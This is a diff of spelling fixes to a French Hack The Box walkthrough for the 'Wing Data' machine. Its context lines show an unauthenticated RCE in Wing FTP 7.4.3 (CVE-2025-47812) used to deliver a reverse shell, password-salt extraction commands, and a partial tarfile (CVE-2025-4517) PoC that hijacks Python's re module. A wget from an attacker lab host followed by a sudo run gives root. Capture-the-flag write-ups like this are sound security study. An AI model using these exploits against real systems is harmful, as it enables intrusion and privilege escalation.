@@ -11,10 +11,10 @@ tableOfContents: false
 
 # Wing Data
 
-la machine Wing Data est une box de difficulté facile proposée par Hack The Box. elle propose une exploitation en trois temps : 
+La machine Wing Data est une box de difficulté facile proposée par Hack The Box. Elle propose une exploitation en trois temps : 
 - Un accès initial en exploitant une vulnérabilité connue. 
 - La récupération et le crack d'un hash nous donnant un mot de passe utilisateur. 
-- Une escalade de privilège via l'exploitation d'une librairie pyhton vulnérable, nous permettant de faire du librairie Hijacking. 
+- Une escalade de privilège via l'exploitation d'une librairie python vulnérable, nous permettant de faire du librairie Hijacking. 
 
 ## Enumeration
 
@@ -47,7 +47,7 @@ Après l’accès à cette application web, on observe que l’application “Cl
 
 https://www.exploit-db.com/exploits/52347
 
-La version de WING FTP est la version 7.4.3. Cette version est sujette à une vulnérabilité CVE-2025-47812 qui permet à un attaquant d’exécuter arbitrairement du code sans êtr authentifié.On va alors forger un reverse shell avec msfvenom, pousser le serveur à le télécharger et à l’exécuter : 
+La version de WING FTP est la version 7.4.3. Cette version est sujette à une vulnérabilité CVE-2025-47812 qui permet à un attaquant d’exécuter arbitrairement du code sans être authentifié. On va alors forger un reverse shell avec msfvenom, pousser le serveur à le télécharger et à l’exécuter : 
 
 ```bash
 #!/bin/bash
@@ -69,13 +69,13 @@ Une fois notre reverse-shell mis en place, nous sommes connecté avec l’utilis
 ```bash
 # ls /home nous montre qu'on a un utilisateur nommé wacky 
 
-# Recuperation du mdp 
+# Récupération du mdp 
 wingftp@wingdata:/opt/wftpserver/Data/1$ cat settings.xml | grep -Ei salt
 cat settings.xml | grep -Ei salt
     <EnablePasswordSalting>1</EnablePasswordSalting>
     <SaltingString>WingFTP</SaltingString>
 
-# Recuperation du salt
+# Récupération du salt
 wingftp@wingdata:/opt/wftpserver/Data/1$ cat settings.xml | grep -Ei salt
 cat settings.xml | grep -Ei salt
     <EnablePasswordSalting>1</EnablePasswordSalting>
@@ -109,13 +109,13 @@ User wacky may run the following commands on wingdata:
 
 ```
 
-le .py charge plusieurs librairies dont : tafile, re, os. la version de python est 3.12.3 ce qui nous indique que tarfile est certainement vulnérable à la CVE-2025-4517. On peut utiliser cette CVE pour hijack une librairie et avoir un shell root. Cette faille permet d’extraire arbitrairement des fichiers d’une archive si celle-ci est mal formée. Le but est donc d’écrire un fichier re.py dans le même dossier que notre script de backup pour que celui-ci soit exécuté à la place de la librairie gérant les regex. se re.py va nous donner un shell. 
+le .py charge plusieurs librairies dont : tarfile, re, os. La version de python est 3.12.3 ce qui nous indique que tarfile est certainement vulnérable à la CVE-2025-4517. On peut utiliser cette CVE pour hijack une librairie et avoir un shell root. Cette faille permet d’extraire arbitrairement des fichiers d’une archive si celle-ci est mal formée. Le but est donc d’écrire un fichier re.py dans le même dossier que notre script de backup pour que celui-ci soit exécuté à la place de la librairie gérant les regex. Ce re.py va nous donner un shell. 
 
 ## Exploit : CVE-2025-4517
 
 https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f
 
-Nous allons modifier le poc fournit par google avec le code ci-dessous : 
+Nous allons modifier le poc fourni par google avec le code ci-dessous : 
 
 ```bash
 import tarfile
@@ -161,7 +161,7 @@ with tarfile.open("backup_777.tar", mode="x") as tar:
     tar.addfile(n, fileobj=io.BytesIO(content))
 ```
 
-On télécharge notre archive et on lance l’executable avec les droits root pour créer notre re.py là où se trouve l’executable sur lequel on a les droits sudo. De cette manière, python va le charger et l’exécuter, en nous donnant un shell bash : 
+On télécharge notre archive et on lance l’exécutable avec les droits root pour créer notre re.py là où se trouve l’exécutable sur lequel on a les droits sudo. De cette manière, python va le charger et l’exécuter, en nous donnant un shell bash : 
 
 ```bash
 wacky@wingdata:/opt/backup_clients/backups$ rm backup* && wget http://10.10.14.201:8888/backup_777.tar && sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py  -b backup_777.tar -r restore_2
